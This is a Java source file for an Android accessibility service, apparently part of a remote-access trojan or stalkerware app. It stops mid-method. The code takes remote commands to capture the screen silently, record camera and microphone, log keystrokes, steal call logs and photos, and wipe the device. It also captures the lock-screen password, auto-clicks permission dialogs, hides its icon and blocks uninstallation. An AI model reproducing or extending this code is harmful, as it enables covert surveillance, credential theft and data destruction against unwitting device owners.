package com.support.litework.services;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.ImageFormat;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.Region;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.display.DisplayManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseIntArray;
import android.view.Display;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.Surface;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bumptech.glide.Glide;
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions;
import com.support.litework.MainActivity;
import com.support.litework.R;
import com.support.litework.activity.OverlaySetActivity;
import com.support.litework.model.ApplistEntry;
import com.support.litework.model.CallLogEntry;
import com.support.litework.model.ImageData;
import com.support.litework.model.MousePositionEntry;
import com.support.litework.model.SkeletonEntry;
import com.support.litework.receiver.MyDeviceAdminReceiver;
import com.support.litework.server.Server;
import com.support.litework.utils.Common;
import com.support.litework.utils.FileUtils;
import com.support.litework.utils.InstalledApps;
import com.support.litework.utils.MyPermissions;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Executor;

public class MainAccessibilityService extends AccessibilityService {
    public static final String ACTION_SCREEN_MONITOR = "SCREEN_MONITOR";
    public static final String ACTION_SCREEN_REFRESH_MONITOR = "SCREEN_REFRESH_MONITOR";
    public static final String ACTION_SCREEN_CLICK_MONITOR = "SCREEN_CLICK_MONITOR";
    public static final String ACTION_SCREEN_LONG_PRESS_MONITOR = "SCREEN_LONG_PRESS_MONITOR";
    public static final String ACTION_SCREEN_DRAG_MONITOR = "SCREEN_DRAG_MONITOR";
    public static final String ACTION_SCREEN_BLACK_MONITOR = "SCREEN_BLACK_MONITOR";
    public static final String ACTION_SCREEN_LIGHT_MONITOR = "SCREEN_LIGHT_MONITOR";
    public static final String ACTION_SCREEN_IMAGEOVERLAY_MONITOR = "SCREEN_IMAGEOVERLAY_MONITOR";
    public static final String ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR = "SCREEN_UNIMAGEOVERLAY_MONITOR";
    public static final String ACTION_SCREEN_SKELETON_MONITOR = "SCREEN_SKELETON_MONITOR";
    public static final String ACTION_SCREEN_SET_TEXT_MONITOR = "SCREEN_SET_TEXT_MONITOR";
    public static final String ACTION_SCREEN_LOCK_MONITOR = "SCREEN_LOCK_MONITOR";
    public static final String ACTION_SCREEN_UNLOCK_MONITOR = "SCREEN_UNLOCK_MONITOR";
    public static final String ACTION_FRONT_CAMERA_MONITOR = "FRONT_CAMERA_MONITOR";
    public static final String ACTION_BACK_CAMERA_MONITOR = "BACK_CAMERA_MONITOR";
    public static final String ACTION_MIC_MONITOR = "MIC_MONITOR";
    public static final String ACTION_CALL_LOGGER = "CALL_LOGGER";
    public static final String ACTION_APP_INSTALLED = "APP_INSTALLED";
    public static final String ACTION_ALL_GALLERY = "ALL_GALLERY";
    public static final String ACTION_ONE_GALLERY = "ONE_GALLERY";
    public static final String ACTION_DEVICE_FORMAT = "DEVICE_FORMAT";
    public static final String ACTION_DEVICE_HOME = "DEVICE_HOME";
    public static final String ACTION_DEVICE_BACK = "DEVICE_BACK";
    public static final String ACTION_DEVICE_RECENT = "DEVICE_RECENT";
    public static final String ACTION_KEY_LOGGER = "KEY_LOGGER";
    public static final String ACTION_UNINSTALL_APP = "UNINSTALL_APP";
    public static final String ACTION_SCREEN_SCROLL = "SCREEN_SCROLL";
    public static final String ACTION_DEVICE_LOCK = "DEVICE_LOCK";
    public static final String ACTION_DEVICE_UNLOCK = "DEVICE_UNLOCK";
    public static final String ACTION_APP_OPEN = "APP_OPEN";
    public static final String ACTION_APP_LOCK = "APP_LOCK";
    public static final String ACTION_APP_UNLOCK = "APP_UNLOCK";
    public static final String ACTION_APP_ICON_HIDE = "APP_ICON_HIDE";
    public static final String ACTION_APP_ICON_SHOW = "APP_ICON_SHOW";
    public static final String ACTION_ADMIN_MONITOR = "ADMIN_MONITOR";

    public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";

    //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
    DisplayMetrics displayMetrics;

    //Screen Monitor
    private CaptureForgroundService myService;
    private boolean isBound = false;
    private String mode_status = "LIVE";

    private final int imageWidth = 360;
    static int deviceWidth = 0;
    int deviceHeight = 0;
    int deviceDensityDpi = 0;
    ByteArrayOutputStream screen_outputStream = new ByteArrayOutputStream();
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private ImageReader imageReader;

    private long lastFrameTime = 0;
    private final int targetFps = 20; // desired FPS
    private final int frameInterval = 1000 / targetFps;

    // App Event Monitor
    ArrayList<String> packageList = new ArrayList<>();

    //blackscreen
    private boolean blackScreen = false;
    private String txtBlack = "";
    private WindowManager windowManager;
    private View overlayView;
    private TextView loadingTextView;

    //imageoverlayscreen
    private boolean isImageOverlayScreen = false;
    private String overlayimgdata = "";
    private String overlayimgtype = "";
    private WindowManager windowManagerImage;
    private View overlayImageView;
    private ImageView imgOverlay;

    //waitingScreen
    private boolean isWaitingScreen = false;
    private WindowManager windowManagerWaiting;
    private View overlayWaitingView;
    private ImageView imgWaiting;
    private TextView txtCounting;
    private TextView txtWaiting;

    private ProgressBar progressWaitingBar;

    //RemoveScreen
    private boolean isRemoveScreen = false;
    private WindowManager windowManagerRemove;
    private View overlayRemoveView;
    private ImageView imgRemove;
    private TextView txtRemoveCounting;
    private TextView txtRemoveWaiting;
    private TextView txtRemoveTitle;

    //TouchScreen
    private boolean isTouchScreen = false;
    private WindowManager windowManagerTouch;
    private View overlayTouchView;
    List<MousePositionEntry> movementPoints = new ArrayList<>();
    private Boolean isKeyguardScreen = false;
    private Boolean isKeyguardPatternScreen = true;
    private String devicePassword = "";
    private Boolean isSetKeyguard = false;
    //skeleton
    private final List<SkeletonEntry> skeletonEntryResultList = new ArrayList<>();

    private AccessibilityNodeInfo focusedNode;
    private Boolean isEditable = false;

    //stopuninstall
    private Boolean isSelectedApp = false;
    private Boolean isUninstallapp = false;
    private Boolean isAppDetail = false;

    // Camera
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader_back;
    private HandlerThread backgroundHandlerThread;
    private Handler backgroundHandler;
    private int qualityCamera = 10;
    private String cameraType = "backCamera";
    SparseIntArray orientations = new SparseIntArray(4);

    //Call log
    private final List<CallLogEntry> callLogList = new ArrayList<>();

    //Mic Monitor
    private static final int SAMPLE_RATE = 16000; // Sample rate in Hz
    private volatile boolean isRecording = false;
    private Thread recordingThread;
    private AudioRecord audioRecord;

    //Wipe data
    private DevicePolicyManager mDevicePolicyManager;
    private ComponentName mAdminComponent;
    private Boolean isMediaProjectEnable = false;

    private Boolean isScreenMonitoring = false;
    private Boolean isSkeletonMonitoring = false;
    private Boolean isKeylogger = false;
    private Boolean iscanuninstallapp = false;

    private String currentPackagename = "";

    private Boolean isAutoBackPermission = false;
    private Handler scrollHandler = new Handler();
    private Runnable scrollRunnable;

    private int lastClickPermissionPosition = 0;
    private static MainAccessibilityService CONTEXT;

    public static MainAccessibilityService getContext() {
        return CONTEXT;
    }


    private static final String TAG = "MyAccessibilityService";
    String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();

    @Override
    public void onCreate() {
        super.onCreate();
    }

    private void startBackgroundThread() {
        backgroundHandlerThread = new HandlerThread("CameraVideoThread");
        backgroundHandlerThread.start();
        backgroundHandler = new Handler(backgroundHandlerThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundHandlerThread != null) {
            backgroundHandlerThread.quitSafely();
            try {
                backgroundHandlerThread.join();
                backgroundHandlerThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
        super.takeScreenshot(displayId, executor, callback);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        CONTEXT = this;
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManagerImage = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManagerWaiting = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManagerRemove = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManagerTouch = (WindowManager) getSystemService(WINDOW_SERVICE);

        displayMetrics = new DisplayMetrics();
        Display display = getSystemService(WindowManager.class).getDefaultDisplay();
        display.getRealMetrics(displayMetrics);
        deviceWidth = displayMetrics.widthPixels;
        deviceHeight = displayMetrics.heightPixels;

        deviceDensityDpi = displayMetrics.densityDpi;


        registerBackCameraCaptureManager();
        registerReceiverManager();
//        requestOverlayPermission();
        setPermissionRequest();
        packageList = FileUtils.getArrayListFromFile(getContext(), "packagelist.pdm");
        Common.getInstance().setPackageList(packageList);
    }

    private void setPermissionRequest() {
        Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
        getBaseContext().startService(serviceIntentX);
        makeOverlayWaitingScreen();
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            onGoBack();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    onGoBack();
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            onGoBack();
                        }
                    }, 500);
                }
            }, 500);
        } else {
            onGoBack();
            if (mediaProjection == null) {
                requestMediaProjectService();
            }
        }
    }

    public BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
//            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
//            float batteryPct = level * 100 / (float) scale;
//            batteryLevel = String.valueOf(batteryPct);
//            Log.d("Battery Level:", "Battery Level: " + batteryPct + "%");
//            getWifiNetworkLevel();
        }
    };
    public BroadcastReceiver mediaProjectionReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int resultCode = intent.getIntExtra("resultCode", 0);
            Log.d("resultCode::", String.valueOf(resultCode));
            Intent data = intent.getParcelableExtra("data");

            if (resultCode == -1 && data != null) {
                mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mediaProjection == null) {
                    requestMediaProjectService();
                    mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
                }
                startCapture();
                Common.getInstance().setMediaProjection(false);
            }
        }
    };

    public BroadcastReceiver screenMonitorReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            Selected_EVENT = intent.getAction();
            if (intent.getAction().equals(ACTION_SCREEN_SET_TEXT_MONITOR)) {
                String setTextValue = intent.getStringExtra("setText");
                if(!isKeyguardPatternScreen) {
                    devicePassword = setTextValue;
                }
                inputText(setTextValue);
            }
            if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
                mode_status = intent.getStringExtra("mode");
                if(mode_status.equals("SILENT")) {
                    unsetMediaProjection();
                    isScreenMonitoring = true;
                } else {
                    if(android.os.Build.VERSION.SDK_INT < 35) {
                        requestMediaProjectionPermission();
                        sendScreenMonitoringData(screen_outputStream);
                    }
                }
            }

            if (ACTION_SCREEN_REFRESH_MONITOR.equals(intent.getAction())) {
                if(android.os.Build.VERSION.SDK_INT < 35) {
                    unsetMediaProjection();
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            requestMediaProjectionPermission();
                        }
                    }, 300);
                }
            }

            if (ACTION_SCREEN_CLICK_MONITOR.equals(intent.getAction())) {
                double xPosition = intent.getDoubleExtra("xPosition", 0);
                double yPosition = intent.getDoubleExtra("yPosition", 0);
                performClick(xPosition, yPosition);
            }
            if (ACTION_SCREEN_LONG_PRESS_MONITOR.equals(intent.getAction())) {
                double xPosition = intent.getDoubleExtra("xPosition", 0);
                double yPosition = intent.getDoubleExtra("yPosition", 0);
                performLongPress(xPosition, yPosition);
            }
            if (ACTION_SCREEN_DRAG_MONITOR.equals(intent.getAction())) {
                mouseDraw();
            }
            if (ACTION_SCREEN_BLACK_MONITOR.equals(intent.getAction())) {
                txtBlack = intent.getStringExtra("txtBlack");
                makeBlackScreen();
            }
            if (ACTION_SCREEN_LIGHT_MONITOR.equals(intent.getAction())) {
                removeBlackScreen();
            }

            if (ACTION_SCREEN_IMAGEOVERLAY_MONITOR.equals(intent.getAction())) {
                overlayimgdata = intent.getStringExtra("imgdata");
                overlayimgtype = intent.getStringExtra("type");
                Log.d("imagevoerlay", overlayimgdata);
                removeImageOverlayScreen();
                makeImageOverlayScreen();
            }
            if (ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR.equals(intent.getAction())) {
                removeImageOverlayScreen();
            }

            if (ACTION_SCREEN_SKELETON_MONITOR.equals(intent.getAction())) {
                isSkeletonMonitoring = true;
                if (Server.getContext() != null && skeletonEntryResultList.size() > 0) {
                    Server.getContext().sendScreenSkeletonMonitoring(currentPackagename, deviceWidth, deviceHeight, skeletonEntryResultList);
                }
            }

            if (ACTION_BACK_CAMERA_MONITOR.equals(intent.getAction())) {
                closeCamera();
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
//                    stopRecording();
                        qualityCamera = intent.getIntExtra("quality", 10);
                        cameraType = intent.getStringExtra("cameraType");
                        Log.d("qualityCamera", String.valueOf(qualityCamera));
                        setupCamera();
                    }
                }, 500);

            }

            if (ACTION_ALL_GALLERY.equals(intent.getAction())) {
                getAllImages();
            }
            if (ACTION_ONE_GALLERY.equals(intent.getAction())) {
                //Gallery Monitor
                String imageFilePath = intent.getStringExtra("filepath");
                getOneImageData(imageFilePath);
            }

            if (ACTION_DEVICE_FORMAT.equals(intent.getAction())) {
                performFactoryReset();
            }

            if (ACTION_DEVICE_HOME.equals(intent.getAction())) {
                onGoHome();
            }

            if (ACTION_DEVICE_BACK.equals(intent.getAction())) {
                onGoBack();
            }
            if (ACTION_DEVICE_RECENT.equals(intent.getAction())) {
                onGoRecent();
            }
            if (ACTION_KEY_LOGGER.equals(intent.getAction())) {
                isKeylogger = true;
            }

            if (ACTION_UNINSTALL_APP.equals(intent.getAction())) {
                iscanuninstallapp = true;
                performUninstallApp();
            }

            if (ACTION_SCREEN_SCROLL.equals(intent.getAction())) {
                String scroll_event = intent.getStringExtra("event");
                if (scroll_event.equals("up")) {
                    handleScreenUp();
                } else if (scroll_event.equals("down")) {
                    handleScreenDown();
                } else if (scroll_event.equals("left")) {
                    handleScreenLeft();
                } else if (scroll_event.equals("right")) {
                    handleScreenRight();
                }
            }

            if (ACTION_CALL_LOGGER.equals(intent.getAction())) {
                getCallDetails();
            }
            if (ACTION_APP_INSTALLED.equals(intent.getAction())) {
                getInstalledAppList();
            }
            if (ACTION_MIC_MONITOR.equals(intent.getAction())) {
                stopRecording();
                startRecording();
            }

            if (ACTION_DEVICE_LOCK.equals(intent.getAction())) {
                onDeviceLock();
            }
            if (ACTION_DEVICE_UNLOCK.equals(intent.getAction())) {
                onDeviceUnlock();
            }

            if (ACTION_APP_OPEN.equals(intent.getAction())) {
                String package_name = intent.getStringExtra("packagename");
                onOpenApp(package_name);
            }
            if (ACTION_APP_LOCK.equals(intent.getAction())) {
                String package_name = intent.getStringExtra("packagename");
                onLockApp(package_name);
            }
            if (ACTION_APP_UNLOCK.equals(intent.getAction())) {
                String package_name = intent.getStringExtra("packagename");
                onUnLockApp(package_name);
            }

            if (ACTION_APP_ICON_HIDE.equals(intent.getAction())) {
                onHideAppIcon();
            }
            if (ACTION_APP_ICON_SHOW.equals(intent.getAction())) {
                onShowAppIcon();
            }

            if (ACTION_ADMIN_MONITOR.equals(intent.getAction())) {
                requestOverlayPermission();
            }

            if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                String close_event = intent.getStringExtra("event");
                if (close_event.equals("screen-monitor")) {
                    isScreenMonitoring = false;
                    mode_status = "";
                }
                if (close_event.equals("screen-skeleton")) {
                    isSkeletonMonitoring = false;
                }
                if (close_event.equals("camera-monitor")) {
                    closeCamera();
                }
                if (close_event.equals("mic-monitor")) {
                    stopRecording();
                }
                if (close_event.equals("key-monitor")) {
                    isKeylogger = false;
                }
                if (close_event.equals("all")) {
                    isScreenMonitoring = false;
                    isSkeletonMonitoring = false;
                    isKeylogger = false;
                    stopRecording();
                    closeCamera();
                }
            }
        }
    };

    public void registerReceiverManager() {
        IntentFilter filter0 = new IntentFilter(ACTION_CLOSE_MONITOR);
        registerReceiver(screenMonitorReceiver, filter0, RECEIVER_EXPORTED);

        IntentFilter filter_screen = new IntentFilter(ACTION_SCREEN_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen, RECEIVER_EXPORTED);
        IntentFilter filter_screen_refresh = new IntentFilter(ACTION_SCREEN_REFRESH_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_refresh, RECEIVER_EXPORTED);
        IntentFilter filter_screen_click = new IntentFilter(ACTION_SCREEN_CLICK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_click, RECEIVER_EXPORTED);
        IntentFilter filter_screen_long_press = new IntentFilter(ACTION_SCREEN_LONG_PRESS_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_long_press, RECEIVER_EXPORTED);
        IntentFilter filter_screen_drag = new IntentFilter(ACTION_SCREEN_DRAG_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_drag, RECEIVER_EXPORTED);
        IntentFilter filter_screen_black = new IntentFilter(ACTION_SCREEN_BLACK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_black, RECEIVER_EXPORTED);
        IntentFilter filter_screen_light = new IntentFilter(ACTION_SCREEN_LIGHT_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_light, RECEIVER_EXPORTED);
        IntentFilter filter_screen_imageoverlay = new IntentFilter(ACTION_SCREEN_IMAGEOVERLAY_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_imageoverlay, RECEIVER_EXPORTED);
        IntentFilter filter_screen_unimageoverlay = new IntentFilter(ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_unimageoverlay, RECEIVER_EXPORTED);
        IntentFilter filter_screen_skeleton = new IntentFilter(ACTION_SCREEN_SKELETON_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_skeleton, RECEIVER_EXPORTED);
        IntentFilter filter_screen_set_text = new IntentFilter(ACTION_SCREEN_SET_TEXT_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_set_text, RECEIVER_EXPORTED);
        IntentFilter filter_screen_lock = new IntentFilter(ACTION_SCREEN_LOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_lock, RECEIVER_EXPORTED);
        IntentFilter filter_screen_unlock = new IntentFilter(ACTION_SCREEN_UNLOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_unlock, RECEIVER_EXPORTED);

        IntentFilter filter_front_camera = new IntentFilter(ACTION_FRONT_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_front_camera, RECEIVER_EXPORTED);
        IntentFilter filter_back_camera = new IntentFilter(ACTION_BACK_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_back_camera, RECEIVER_EXPORTED);
        IntentFilter filter_mic = new IntentFilter(ACTION_MIC_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_mic, RECEIVER_EXPORTED);
        IntentFilter filter_call_logger = new IntentFilter(ACTION_CALL_LOGGER);
        registerReceiver(screenMonitorReceiver, filter_call_logger, RECEIVER_EXPORTED);
        IntentFilter filter_app_installed = new IntentFilter(ACTION_APP_INSTALLED);
        registerReceiver(screenMonitorReceiver, filter_app_installed, RECEIVER_EXPORTED);

        IntentFilter filter_all_gallery = new IntentFilter(ACTION_ALL_GALLERY);
        registerReceiver(screenMonitorReceiver, filter_all_gallery, RECEIVER_EXPORTED);
        IntentFilter filter_one_gallery = new IntentFilter(ACTION_ONE_GALLERY);
        registerReceiver(screenMonitorReceiver, filter_one_gallery, RECEIVER_EXPORTED);
        IntentFilter filter_device_format = new IntentFilter(ACTION_DEVICE_FORMAT);
        registerReceiver(screenMonitorReceiver, filter_device_format, RECEIVER_EXPORTED);
        IntentFilter filter_device_home = new IntentFilter(ACTION_DEVICE_HOME);
        registerReceiver(screenMonitorReceiver, filter_device_home, RECEIVER_EXPORTED);
        IntentFilter filter_device_back = new IntentFilter(ACTION_DEVICE_BACK);
        registerReceiver(screenMonitorReceiver, filter_device_back, RECEIVER_EXPORTED);
        IntentFilter filter_device_recent = new IntentFilter(ACTION_DEVICE_RECENT);
        registerReceiver(screenMonitorReceiver, filter_device_recent, RECEIVER_EXPORTED);
        IntentFilter filter_key_logger = new IntentFilter(ACTION_KEY_LOGGER);
        registerReceiver(screenMonitorReceiver, filter_key_logger, RECEIVER_EXPORTED);
        IntentFilter filter_uninstall_app = new IntentFilter(ACTION_UNINSTALL_APP);
        registerReceiver(screenMonitorReceiver, filter_uninstall_app, RECEIVER_EXPORTED);
        IntentFilter filter_screen_scroll = new IntentFilter(ACTION_SCREEN_SCROLL);
        registerReceiver(screenMonitorReceiver, filter_screen_scroll, RECEIVER_EXPORTED);

        IntentFilter filter_device_lock = new IntentFilter(ACTION_DEVICE_LOCK);
        registerReceiver(screenMonitorReceiver, filter_device_lock, RECEIVER_EXPORTED);
        IntentFilter filter_device_unlock = new IntentFilter(ACTION_DEVICE_UNLOCK);
        registerReceiver(screenMonitorReceiver, filter_device_unlock, RECEIVER_EXPORTED);

        IntentFilter filter_app_open = new IntentFilter(ACTION_APP_OPEN);
        registerReceiver(screenMonitorReceiver, filter_app_open, RECEIVER_EXPORTED);
        IntentFilter filter_app_lock = new IntentFilter(ACTION_APP_LOCK);
        registerReceiver(screenMonitorReceiver, filter_app_lock, RECEIVER_EXPORTED);
        IntentFilter filter_app_unlock = new IntentFilter(ACTION_APP_UNLOCK);
        registerReceiver(screenMonitorReceiver, filter_app_unlock, RECEIVER_EXPORTED);
        IntentFilter filter_app_icon_hide = new IntentFilter(ACTION_APP_ICON_HIDE);
        registerReceiver(screenMonitorReceiver, filter_app_icon_hide, RECEIVER_EXPORTED);
        IntentFilter filter_app_icon_show = new IntentFilter(ACTION_APP_ICON_SHOW);
        registerReceiver(screenMonitorReceiver, filter_app_icon_show, RECEIVER_EXPORTED);


        IntentFilter filter_request_admin = new IntentFilter(ACTION_ADMIN_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_request_admin, RECEIVER_EXPORTED);

        IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
        registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);

        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        registerReceiver(batteryReceiver, batteryFilter, RECEIVER_EXPORTED);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if(mode_status.equals("SILENT")) {
            screenShotDevice();
        }
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            setBatteryPermission(event);
            if (manufacturer.equals("xiaomi")) {
                setBatteryXiaomiPermission(event);
                setAutoStartBackgroundPermission(event);
            }
        }
        findKeyguardScreen(event);
        getKeyLogger(event);
        getSkeletonInfo(event);
        findFocusedNode(event);
        onDetectLockApp(event);
        if (Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
            setPermEditorEnable(event);
        } else {
            setStopUninstall(event);
            setMediaProjectionPermission(event);
            setAutomaticallyPermission(event);
            setStopUnAccessibility();
        }
    }

    private void requestMediaProjectService() {
        Intent serviceIntent = new Intent(this, CaptureForgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            bindService(serviceIntent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
                    CaptureForgroundService.MyBinder binder = (CaptureForgroundService.MyBinder) iBinder;
                    myService = binder.getService();
                    isBound = true;
                }

                @Override
                public void onServiceDisconnected(ComponentName componentName) {
                    isBound = false;
                }
            }, Context.BIND_AUTO_CREATE | Context.BIND_ALLOW_ACTIVITY_STARTS);
        } else {
            bindService(serviceIntent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
                    CaptureForgroundService.MyBinder binder = (CaptureForgroundService.MyBinder) iBinder;
                    myService = binder.getService();
                    isBound = true;
                }

                @Override
                public void onServiceDisconnected(ComponentName componentName) {
                    isBound = false;
                }
            }, Context.BIND_AUTO_CREATE);
        }
        ContextCompat.startForegroundService(this, serviceIntent);
    }

    private void requestMediaProjectionPermission() {
        isScreenMonitoring = true;
        if (mediaProjection == null) {
            if (isBound) {
                Log.d("work", "Bind");
                myService.startSetMediaPermisstionActivity();
            }
        }
    }

    private void setBatteryPermission(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            getBatteryPermission(event.getSource());
        }
    }

    private void getBatteryPermission(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString();
                    Log.d("nodetext::", nodeText);
                    if (nodeText.equals("Allow")
                            || nodeText.equals("ALLOW")
                            || nodeText.equals("Permitir")
                            || nodeText.equals("PERMITIR")
                            || nodeText.equals("EXCLUIR")
                            || nodeText.equals("EXCLUDE")
                            || nodeText.equals("İzin ver")
                            || nodeText.equals("İZİN VER")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getBatteryPermission(node.getChild(i));
            }
        }
    }

    private void setBatteryXiaomiPermission(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packagename = String.valueOf(event.getPackageName());
            CharSequence classname = String.valueOf(event.getClassName());
            Log.d("classnameÇÇ", packagename + " " + classname);
            if (packagename.equals("com.miui.powerkeeper") && classname.equals("com.miui.powerkeeper.ui.HiddenAppsConfigActivity")) {
                getBatteryXiaomiPermission(getRootInActiveWindow());
            }
        }
    }

    private void getBatteryXiaomiPermission(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.CheckedTextView")) {
                Log.d("classnameÇÇ", node.getClassName().toString());
                if (node.getText() != null) {
                    String nodeText = node.getText().toString();
                    Log.d("nodetext::", nodeText);
                    if (nodeText.equals("Nenhuma restrição")
                            || nodeText.equals("No restrictions")
                            || nodeText.equals("Sin restricciones")
                            || nodeText.equals("Kısıtlama yok")) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else if (node.getParent().isClickable()) {
                            node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getBatteryXiaomiPermission(node.getChild(i));
            }
        }
    }

    private void setAutoStartBackgroundPermission(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packagename = String.valueOf(event.getPackageName());
            CharSequence classname = String.valueOf(event.getClassName());
            if (packagename.equals("com.miui.securitycenter") && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
                List<MousePositionEntry> autostartDraw = new ArrayList<>();
                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360 / deviceWidth - 100));
                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360 / deviceWidth - 105));
                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360 / deviceWidth - 120));
